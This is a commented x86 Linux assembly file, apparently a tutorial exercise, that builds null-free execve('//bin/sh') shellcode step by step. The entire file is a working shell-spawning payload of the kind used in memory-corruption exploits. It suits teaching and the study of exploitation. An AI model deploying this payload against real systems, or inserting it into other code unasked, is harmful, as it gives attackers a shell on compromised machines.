
global _start

section .text:

_start:

	xor eax, eax

	 ; xoring the eax register and creating zeroes for null terminator string 0x0

	push eax

	; pushing eax to the stack ( zeroes )
	; PUSH //bin/sh in reverse order because the stack grows from higher to lower mem hs/nib//
	; also we are allowed to do it in order of 4 because //bin/sh in linux is the same as /bin/sh
	; next thing is to find the hexadecimal value of "hs/nib//" --> 68732f6e69622f2f

	push 0x68732f6e 

	; pushing the values onto the stack

	push 0x69622f2f
	
	; then we need to make ebx to point to our string //bin/sh

	mov ebx, esp

	; esp is the pointer to the top of the stack
	; now wee need the third argument of the execve function which we store in edx which is also null
	; we can do it by pushin eax which contains nullbytes to the stack and then copying esp to edx

	push eax
	mov edx, esp

	; next comes the ecx which contains the memory address of //bin/sh

	push ebx
	mov ecx, esp

	; now ecx points to the starting address of //bin/sh
	; all we need to do now is initaite an interrupt and call the execve function which has a number of 11

	mov al, 0xb 

	; we move to al to avoid nulls in the shellcode since this will move only 8 bits
	
	int 0x80


	
	
	
